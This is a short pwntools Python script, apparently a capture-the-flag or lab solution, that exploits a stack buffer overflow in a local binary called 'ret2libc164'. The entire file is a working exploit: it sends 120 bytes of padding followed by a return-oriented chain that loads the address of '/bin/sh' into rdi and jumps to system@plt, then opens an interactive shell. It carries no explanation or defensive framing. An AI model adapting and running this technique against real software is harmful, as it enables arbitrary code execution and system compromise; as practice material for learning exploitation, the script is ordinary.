#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
sh = process('./ret2libc164')
# gdb.attach(sh)
# gdb.attach(proc.pidof(sh)[0], gdbscript="b main")
binsh_addr = 0x00000000004008b4
system_plt = 0x00000000004005f0
rdi_addr = 0x0000000000400893
payload = 'a'*112 + 'b'*8 +p64(rdi_addr) + p64(binsh_addr) + p64(system_plt)
# payload = flat(['a' * 112, 'b' * 8,p64(rdi_addr), binsh_addr,system_plt])
sh.sendline(payload)
pause()
sh.interactive()
